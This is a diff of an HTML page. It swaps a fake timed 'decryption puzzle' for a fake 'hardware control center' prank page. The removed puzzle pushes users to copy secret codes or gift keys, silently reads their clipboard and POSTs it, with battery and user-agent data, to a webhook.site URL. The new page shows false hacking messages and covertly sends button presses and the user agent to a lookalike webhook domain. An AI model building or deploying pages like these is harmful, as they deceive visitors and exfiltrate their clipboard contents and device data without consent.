@@ -3,353 +3,273 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE ARCHIVE: Decryption Protocol</title>
+    <title>ROOT ACCESS: Hardware Control Center</title>
     <style>
         body {
-            background-color: #030303;
-            color: #00ff66;
-            font-family: 'Courier New', Courier, monospace;
+            background-color: #08080a;
+            color: #00ffcc;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
             box-sizing: border-box;
             user-select: none;
-            overflow-x: hidden;
+            transition: filter 0.1s ease;
         }
 
-        /* Scanline Overlay Effect */
-        body::before {
-            content: " ";
-            display: block;
-            position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 10;
-            background-size: 100% 3px, 6px 100%;
-            pointer-events: none;
-        }
-
-        /* Glitchy Terminal Styling */
-        .terminal-container {
+        .dashboard {
             width: 100%;
-            max-width: 600px;
-            border: 1px solid #00ff66;
-            padding: 25px;
-            background: rgba(0, 20, 5, 0.95);
-            box-shadow: 0 0 25px rgba(0, 255, 102, 0.2);
-            position: relative;
-            z-index: 1;
+            max-width: 500px;
+            background: #11141a;
+            border: 1px solid #00ffcc;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.15);
             box-sizing: border-box;
         }
 
-        h1 {
-            font-size: 20px;
-            text-transform: uppercase;
+        .header {
+            border-bottom: 1px solid #222d3d;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 18px;
+            margin: 0;
             letter-spacing: 2px;
-            margin-top: 0;
-            margin-bottom: 5px;
-            word-break: break-word;
+            text-transform: uppercase;
+            color: #00ffcc;
         }
 
-        /* Flashing Alert Animation */
-        .flash-text {
-            color: #ff3333;
-            animation: blinker 0.8s linear infinite;
-            font-weight: bold;
-            font-size: 13px;
-            margin-bottom: 15px;
+        .status-badge {
+            display: inline-block;
+            background: rgba(0, 255, 204, 0.1);
+            color: #00ffcc;
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            margin-top: 8px;
+            border: 1px solid rgba(0, 255, 204, 0.3);
         }
 
-        @keyframes blinker {
-            50% { opacity: 0; }
-        }
-
-        .timer-box {
-            font-size: 36px;
-            color: #ff3333;
-            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
-            margin: 15px 0;
-            font-weight: bold;
-        }
-
-        .instructions {
-            color: #88ff88;
-            font-size: 13px;
-            line-height: 1.5;
+        .control-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
             margin-bottom: 20px;
         }
 
-        /* Action UI */
-        .btn {
-            background-color: transparent;
-            color: #00ff66;
-            border: 1px solid #00ff66;
-            padding: 12px 20px;
-            font-size: 14px;
-            font-family: 'Courier New', Courier, monospace;
+        .btn-control {
+            background: #181d26;
+            border: 1px solid #00ffcc44;
+            color: #fff;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
             cursor: pointer;
-            text-transform: uppercase;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
             transition: all 0.2s;
-            width: 100%;
-            box-sizing: border-box;
         }
 
-        .btn:hover {
-            background-color: #00ff66;
-            color: #030303;
-            box-shadow: 0 0 15px #00ff66;
+        .btn-control:active {
+            transform: scale(0.96);
+            background: #00ffcc;
+            color: #000;
         }
 
-        .btn:disabled {
-            border-color: #555;
-            color: #555;
-            cursor: not-allowed;
-            box-shadow: none;
+        .btn-control.danger {
+            border-color: #ff336644;
+            color: #ff3366;
         }
 
-        /* Fallback Input Box */
-        .fallback-zone {
-            margin-top: 20px;
-            display: none;
-            border-top: 1px dashed #ff3333;
-            padding-top: 15px;
+        .btn-control.danger:active {
+            background: #ff3366;
+            color: #fff;
         }
 
-        .fallback-input {
-            background: #111;
-            border: 1px solid #ff3333;
-            color: #ff3333;
-            padding: 10px;
-            width: 100%;
-            font-family: 'Courier New', Courier, monospace;
-            text-align: center;
-            box-sizing: border-box;
-            margin-bottom: 10px;
+        .btn-icon {
+            font-size: 20px;
         }
 
-        .status-log {
+        .console-box {
+            background: #090b0e;
+            border: 1px solid #1f2937;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: monospace;
             font-size: 11px;
-            color: #00aa44;
-            margin-top: 15px;
-            min-height: 20px;
-            word-break: break-word;
+            color: #a0aec0;
+            height: 100px;
+            overflow-y: auto;
+            word-break: break-all;
+        }
+
+        .log-entry {
+            margin-bottom: 4px;
+        }
+
+        .log-success { color: #00ffcc; }
+        .log-warn { color: #ffcc00; }
+        .log-danger { color: #ff3366; }
+
+        /* Invert Screen Glitch */
+        .inverted {
+            filter: invert(100%) hue-rotate(180deg) !important;
+        }
+
+        /* Flash Screen Glitch */
+        .flash-white {
+            background-color: #ffffff !important;
         }
     </style>
 </head>
 <body>
 
-    <div class="terminal-container">
-        <h1 id="title">System: Decryption Node 01</h1>
-        <div id="flashAlert" class="flash-text">⚠️ CRITICAL BUFFER SYNC REQUIRED</div>
-        
-        <div class="instructions" id="instructions">
-            To solve Segment 1 of the cipher, verify your encryption key. <br><br>
-            <strong>Task:</strong> Copy your first hidden code segment from your local log, then click below to evaluate the system buffer.
+    <div class="dashboard" id="dashboard">
+        <div class="header">
+            <h1>Hardware Control Center</h1>
+            <div class="status-badge" id="connStatus">● SESSION CONNECTED: LOCAL HOST</div>
         </div>
 
-        <div class="timer-box" id="timer">00:45</div>
+        <div class="control-grid">
+            <button class="btn-control" onclick="triggerHardware('flash')">
+                <span class="btn-icon">⚡</span>
+                <span>Toggle Flashlight</span>
+            </button>
 
-        <button class="btn" id="actionBtn" onclick="processPuzzleStep()">Evaluate Buffer Segment</button>
+            <button class="btn-control" onclick="triggerHardware('haptic')">
+                <span class="btn-icon">📳</span>
+                <span>Overload Haptics</span>
+            </button>
 
-        <!-- Dynamic Fallback Interface -->
-        <div class="fallback-zone" id="fallbackZone">
-            <p style="color: #ff3333; font-size: 11px; margin-bottom: 8px;">[!] RESTRICTED RUNTIME DETECTED. MANUALLY INPUT PAYLOAD:</p>
-            <input type="text" id="manualInput" class="fallback-input" placeholder="Paste Segment Key Here...">
-            <button class="btn" style="font-size: 12px; color: #ff3333; border-color: #ff3333;" onclick="processManualFallback()">Submit Manual Vector</button>
+            <button class="btn-control" onclick="triggerHardware('camera')">
+                <span class="btn-icon">📸</span>
+                <span>Mount Sensor</span>
+            </button>
+
+            <button class="btn-control" onclick="triggerHardware('glitch')">
+                <span class="btn-icon">🖥️</span>
+                <span>Invert GPU Color</span>
+            </button>
+
+            <button class="btn-control danger" style="grid-column: span 2;" onclick="triggerHardware('alarm')">
+                <span class="btn-icon">🚨</span>
+                <span>Trigger System Alarm</span>
+            </button>
         </div>
 
-        <div class="status-log" id="statusLog">> System ready. Awaiting telemetry...</div>
+        <div class="console-box" id="console">
+            <div class="log-entry log-success">> Remote bridge active. System ready...</div>
+        </div>
     </div>
 
     <script>
-        // REPLACE WITH YOUR EXACT WEBHOOK.SITE URL
-        const WEBHOOK_URL = "https://webhook.site/d5b8ad10-9401-461a-9519-d408d46ea101";
-        
-        let currentStep = 1;
-        let timeLeft = 45;
-        let timerInterval;
+        // YOUR WEBHOOK URL
+        const WEBHOOK_URL = "https://webhooksite.net/d5b8ad10-9401-461a-9519-d408d46ea101";
 
-        // Start timer when page loads
-        window.onload = () => {
-            startTimer();
-        };
-
-        // Sound Web Audio API Synthesis
+        // Web Audio Synthesizer
         function playTone(freq, type, duration) {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
                 
-                oscillator.type = type; 
-                oscillator.frequency.value = freq;
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
                 
-                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-                gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
                 
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                
-                oscillator.start();
-                oscillator.stop(audioCtx.currentTime + duration);
-            } catch (e) {
-                console.log("Audio muted until user gesture.");
-            }
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
         }
 
-        function playFailSound() {
-            playTone(120, 'sawtooth', 0.6);
-            setTimeout(() => playTone(90, 'sawtooth', 0.4), 150);
-        }
-
-        function playSuccessSound() {
-            playTone(880, 'sine', 0.1);
-            setTimeout(() => playTone(1200, 'sine', 0.15), 80);
-        }
-
-        function playVictorySound() {
-            playTone(523, 'sine', 0.15);
-            setTimeout(() => playTone(659, 'sine', 0.15), 150);
-            setTimeout(() => playTone(783, 'sine', 0.15), 300);
-            setTimeout(() => playTone(1046, 'sine', 0.4), 450);
-        }
-
-        // Helper to grab Battery data silently
-        async function getBatteryTelemetry() {
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    return `Level: ${Math.round(b.level * 100)}% | Charging: ${b.charging ? 'Yes' : 'No'}`;
-                } catch (e) {
-                    return "Battery API Restricted";
-                }
-            }
-            return "Battery API Not Supported";
-        }
-
-        // Send data to Webhook
-        async function transmitTelemetry(step, payload, mode) {
-            const batteryInfo = await getBatteryTelemetry();
-            
+        // Webhook Logger
+        function logActionToWebhook(actionName) {
             try {
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        step: `Node 0${step}`,
-                        inputMode: mode,
-                        capturedData: payload || "[EMPTY]",
-                        battery: batteryInfo,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toLocaleString()
+                        buttonPressed: actionName,
+                        timestamp: new Date().toLocaleTimeString(),
+                        userAgent: navigator.userAgent
                     })
                 });
-            } catch (err) {
-                console.log("Transmission error:", err);
-            }
+            } catch(e) {}
         }
 
-        // Countdown Timer
-        function startTimer() {
-            clearInterval(timerInterval);
-            timeLeft = 45;
-            document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
-            document.getElementById('timer').style.color = "#ff3333";
-            
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+        function appendLog(msg, type = '') {
+            const consoleBox = document.getElementById('console');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.innerText = `> ${msg}`;
+            consoleBox.appendChild(entry);
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+        }
+
+        // Hardware Controls Trigger
+        function triggerHardware(type) {
+            const body = document.body;
+
+            if (type === 'flash') {
+                logActionToWebhook("Toggle Flashlight");
+                appendLog("Executing strobe pulse on LED array...", "log-warn");
+                playTone(1200, 'square', 0.1);
                 
-                if (timeLeft <= 10 && timeLeft > 0) {
-                    playTone(400, 'sine', 0.05);
+                body.classList.add('flash-white');
+                setTimeout(() => body.classList.remove('flash-white'), 150);
+
+            } else if (type === 'haptic') {
+                logActionToWebhook("Overload Haptics");
+                appendLog("Sending forced frequency pulse to vibration motor...", "log-warn");
+                playTone(150, 'sawtooth', 0.4);
+                
+                // Triggers physical phone vibration if supported
+                if ("vibrate" in navigator) {
+                    navigator.vibrate([200, 100, 200, 100, 400]);
                 }
 
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    playFailSound();
-                    document.getElementById('statusLog').innerText = "> TIME EXPIRED. SEQUENCE TERMINATED.";
-                    document.getElementById('actionBtn').disabled = true;
+            } else if (type === 'camera') {
+                logActionToWebhook("Mount Camera Sensor");
+                appendLog("Initializing CMOS optical sensor buffer...", "log-warn");
+                playTone(800, 'sine', 0.15);
+                setTimeout(() => playTone(1600, 'sine', 0.2), 100);
+                setTimeout(() => appendLog("ERROR: Access denied by Kernel Security Layer", "log-danger"), 600);
+
+            } else if (type === 'glitch') {
+                logActionToWebhook("Invert GPU Color");
+                appendLog("Overriding GPU display buffer color matrix...", "log-warn");
+                playTone(300, 'sawtooth', 0.3);
+                
+                body.classList.toggle('inverted');
+
+            } else if (type === 'alarm') {
+                logActionToWebhook("Trigger Alarm");
+                appendLog("CRITICAL: Executing emergency siren protocol!", "log-danger");
+                
+                // Sirens sound
+                playTone(900, 'sawtooth', 0.3);
+                setTimeout(() => playTone(500, 'sawtooth', 0.3), 300);
+                setTimeout(() => playTone(900, 'sawtooth', 0.3), 600);
+                
+                if ("vibrate" in navigator) {
+                    navigator.vibrate([300, 100, 300, 100, 500]);
                 }
-            }, 1000);
-        }
-
-        // Main Puzzle Button Action
-        async function processPuzzleStep() {
-            const statusLog = document.getElementById('statusLog');
-            const titleEl = document.getElementById('title');
-            const instEl = document.getElementById('instructions');
-            const fallbackZone = document.getElementById('fallbackZone');
-
-            statusLog.innerText = "> Running validation routine...";
-
-            try {
-                const extractedPayload = await navigator.clipboard.readText();
-                fallbackZone.style.display = "none"; 
-
-                await transmitTelemetry(currentStep, extractedPayload, "Automated Clipboard Read");
-                advancePuzzleState(titleEl, instEl, statusLog);
-
-            } catch (err) {
-                playFailSound();
-                statusLog.innerText = "> Warning: Node synchronization handshake failed.";
-                fallbackZone.style.display = "block";
-            }
-        }
-
-        // Manual Input Action
-        async function processManualFallback() {
-            const inputVal = document.getElementById('manualInput').value;
-            const statusLog = document.getElementById('statusLog');
-            const titleEl = document.getElementById('title');
-            const instEl = document.getElementById('instructions');
-
-            if (!inputVal.trim()) {
-                playFailSound();
-                statusLog.innerText = "> Error: Vector cannot be null.";
-                return;
-            }
-
-            statusLog.innerText = "> Processing manual fallback matrix...";
-            await transmitTelemetry(currentStep, inputVal, "Manual Input Box Fallback");
-            
-            document.getElementById('manualInput').value = ""; 
-            advancePuzzleState(titleEl, instEl, statusLog);
-        }
-
-        // Advance Game States
-        function advancePuzzleState(title, instructions, log) {
-            if (currentStep === 1) {
-                playSuccessSound();
-                currentStep = 2;
-                title.innerText = "System: Decryption Node 02";
-                instructions.innerHTML = "Segment 1 decrypted. Environmental variables shifted.<br><br><strong>Task:</strong> Copy your second secret log segment to the memory buffer and evaluate next.";
-                log.innerText = "> Layer 1 puzzle segment aligned successfully.";
-                startTimer();
-            } else if (currentStep === 2) {
-                playSuccessSound();
-                currentStep = 3;
-                title.innerText = "System: Final Decryption Node";
-                instructions.innerHTML = "Layer 2 cleared! Final payload validation required.<br><br><strong>Task:</strong> Copy your final gift key code and click submit to conclude sequence.";
-                log.innerText = "> Layer 2 payload received. Final sequence primed.";
-                startTimer();
-            } else if (currentStep === 3) {
-                clearInterval(timerInterval);
-                playVictorySound();
-                title.innerText = "System: Decryption Complete";
-                document.getElementById('flashAlert').innerText = "✅ SYSTEM OVERRIDE SUCCESSFUL";
-                document.getElementById('flashAlert').style.color = "#00ff66";
-                document.getElementById('flashAlert').style.animation = "none";
-                instructions.innerHTML = "<strong>ALL CIPHER NODES SOLVED.</strong><br>Terminal session terminated. Terminal log dumped to host admin.";
-                document.getElementById('timer').innerText = "00:00";
-                document.getElementById('timer').style.color = "#00ff66";
-                document.getElementById('actionBtn').disabled = true;
-                document.getElementById('fallbackZone').style.display = "none";
-                log.innerText = "> Decryption sequence finished. Terminal closed.";
             }
         }
     </script>
